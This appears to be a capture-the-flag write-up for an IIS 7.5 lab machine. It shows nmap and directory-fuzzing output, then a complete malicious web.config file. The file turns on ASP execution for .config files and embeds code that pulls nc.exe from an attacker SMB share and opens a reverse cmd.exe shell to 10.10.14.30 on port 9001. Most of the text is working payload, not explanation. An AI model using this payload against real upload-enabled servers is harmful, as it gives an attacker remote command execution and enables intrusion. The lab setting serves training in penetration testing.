#### Nmap

```bash
# nmap -p- -A -T4 -v -oG nmap/full-scan 10.129.36.76
Nmap scan report for 10.129.36.76
Host is up (0.054s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 7.5
|_http-title: Bounty
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```


#### Fuzzing

```bash
# dirsearch -u http://10.129.36.65:80/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
[18:44:08] 301 -  157B  - /UploadedFiles  ->  http://10.129.36.76/UploadedFiles/
[18:44:39] 301 -  157B  - /uploadedFiles  ->  http://10.129.36.76/uploadedFiles/
[18:46:59] 301 -  157B  - /uploadedfiles  ->  http://10.129.36.76/uploadedfiles/
```
```bash
# gobuster dir -u http://10.129.36.76/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -x .aspx  
/transfer.aspx        (Status: 200) [Size: 941]
```


#### web.config RCE file

```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />         
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
</configuration>
<%
Set rs = CreateObject("WScript.Shell")
Set cmd = rs.Exec("cmd /c \\10.10.14.30\share\nc.exe -e cmd.exe 10.10.14.30 9001")
o = cmd.StdOut.Readall()
Response.write(o)
%>
```